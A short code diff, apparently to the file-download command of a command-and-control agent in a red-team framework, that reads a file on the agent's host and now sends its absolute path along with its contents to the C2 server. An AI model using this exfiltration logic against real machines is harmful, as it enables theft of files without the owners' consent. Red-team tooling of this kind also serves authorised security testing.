@@ -1,5 +1,6 @@
 def download(apfell, c2, params="", task_id=""):
     import json
+    import os
     try:
         file = open(params, 'rb')
     except Exception as e:
@@ -9,7 +10,8 @@ def download(apfell, c2, params="", task_id=""):
         return
     try:
         data = file.read()
-        c2.download(task_id=task_id, data=data)
+        path = os.path.abspath(params)
+        c2.download(task_id=task_id, data=data, path=path)
         output = json.dumps({"user_output": "Finished downloading", "completed": True})
         c2.post_response(response=output, task_id=task_id)
     except Exception as e:
